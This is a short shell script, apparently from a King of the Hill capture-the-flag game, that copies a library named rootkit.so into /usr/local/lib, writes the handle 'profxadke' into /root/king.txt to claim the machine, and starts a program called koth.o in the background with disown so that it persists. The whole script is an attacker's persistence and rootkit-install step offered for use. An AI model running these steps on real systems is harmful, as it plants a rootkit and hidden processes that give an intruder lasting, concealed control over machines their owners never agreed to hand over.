#!/bin/sh

cp ./rootkit.so /usr/local/lib/rootkit.so
echo profxadke > /root/king.txt
./koth.o & disown
